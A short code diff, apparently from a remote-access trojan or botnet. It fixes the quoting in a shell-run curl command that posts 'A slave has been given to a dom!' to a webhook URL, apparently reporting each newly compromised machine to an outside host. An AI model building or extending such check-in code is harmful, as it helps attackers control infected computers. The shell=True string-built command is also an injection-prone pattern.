@@ -43,7 +43,7 @@ def start():
                        ' -X POST --data "{\"content\":' 
                        f'\"A slave has been given to a dom!\"'
                        '}"'
-                       f'{HOOKU}"')
+                       f'"{HOOKU}"')
                 run(cmd, shell=True)
                 print(s)
             except Exception as e:
